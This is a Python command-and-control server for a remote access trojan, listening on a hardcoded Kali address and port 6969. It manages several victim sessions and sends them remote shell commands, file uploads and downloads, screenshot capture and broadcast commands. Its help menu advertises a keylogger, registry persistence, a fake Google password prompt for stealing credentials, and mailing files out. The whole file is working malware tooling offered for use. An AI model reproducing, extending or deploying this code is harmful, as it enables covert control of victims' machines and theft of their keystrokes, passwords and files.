import socket
import termcolor
import json
import os
import threading


ipKali = '172.25.7.193'
port = 6969

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(target, filename):
    print('Start Uploading...')
    f = open(filename, 'rb')
    target.send(f.read())
    print(termcolor.colored('The Files Has Uploaded Successfully\n', 'green'))

def download_file(target, filename):
    print('start downloading...')
    f = open(filename, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    print(termcolor.colored('The File has Downloaded Successfuly\n', 'green'))

def target_communication(target, ip):
    count = 0
    while True:
        #reliable_send('pwd')
        #reliable_send('cd')
        #pathPwd = str(reliable_recv())
        command = input(termcolor.colored('* Shell~%s\n>>>>>>   ' % str(ip), 'blue'))
        reliable_send(target, command)

        if command.lower() == 'quit' or command.lower() == 'exit':
            print('quiting...')
            break
        elif command.lower() == 'background':
            print('quiting...')
            break
        elif command.lower() == 'clear':
            os.system('clear')
        elif command.lower()[:3] == 'cd ':
            print(termcolor.colored('Entered Directory Successfuly\n', 'blue'))
        elif command.lower()[:6] == 'upload':
            upload_file(target, command[7:])
        elif command.lower()[:8] == 'download':
            download_file(target, command[9:])
        elif command.lower() == 'screen shot' or command.lower() == 'ss':
            print('Getting Screenshot...')
            f = open("screenshots/screen_shot%d.png" % count, 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            print(termcolor.colored('Screenshot Saved Successfuly\n', 'green'))

            count += 1
        elif command.lower() == 'help':
            print(termcolor.colored('''\ncommands:
            quit / exit                         -->            Quit Session With The Target
            clear                               -->            Clear The Screen
            cd *Directory Name*                 -->            Change Directory To Target System
            upload *file Name*                  -->            Upload File To The Target Machine
            download *file Name*                -->            Download File From The Target Machine
            keylog start / kl start             -->            Start The KeyLogger
            keylog dump / kl dump               -->            Print Keystroke That Target Inputted
            keylog stop / kl stop               -->            Stop And Seilf Destruct KeyLogger File
            persistence *RegName* *fileName*    -->            Create Persistence In Registry
            persis *RegName* *fileName*          -->            Create Persistence In Registry
            google ver                           -->            Open Monogame That Ask For Password For Google Account
            sm *fileName* *Mail Address*        -->            Send The file To The main Adress''', 'green'))
        else:
            result = reliable_recv(target)
            print(result)
    print(termcolor.colored('bye bye ..... :-(\n', 'red'))

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored('[+] Target Connected From:\t' + str(ip), 'green'))
        except:
            pass


targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ipKali, port))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(termcolor.colored('[+] Listening For The Incoming Connections', 'yellow'))


while True:
    command = input(termcolor.colored('* Command & Control Center:\n>>>>>>   ', 'cyan'))
    if command.lower() == 'targets':
        counter = 0
        print('Targets:')
        for ip in ips:
            print('\t\tSession ' + str(counter) + '  <--> ' + str(ip))
            counter += 1
    elif command.lower() == 'clear':
        os.system('clear')
    elif command[:7].lower() == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print(termcolor.colored('[-] No Session Under That ID Number', 'red'))
    elif command.lower() == 'exit' or command.lower() == 'quit':
        for target in targets:
            reliable_send(target, 'quitexitnow')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        print(termcolor.colored('bye bye... :-(', 'red'))

        break
    elif command[:4].lower() == 'kill':
        print('Killing Target...')
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quitexitnow')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
        print(termcolor.colored('Target Has Being Killed Successfully :-)', 'green'))
    elif command[:7].lower() == 'sendall':
        x = len(targets)
        i = 0
        try:
            print('start sending...')
            while i < x:
                tarnumber = targets[i]
                reliable_send(tarnumber, command)
                i += 1
            print(termcolor.colored('Sending Finished Successfully :-)', 'green'))
        except:
            print(termcolor.colored('Failed :-(', 'red'))
    else:
        print(termcolor.colored('Command Doesnt Exist! :-O', 'red'))








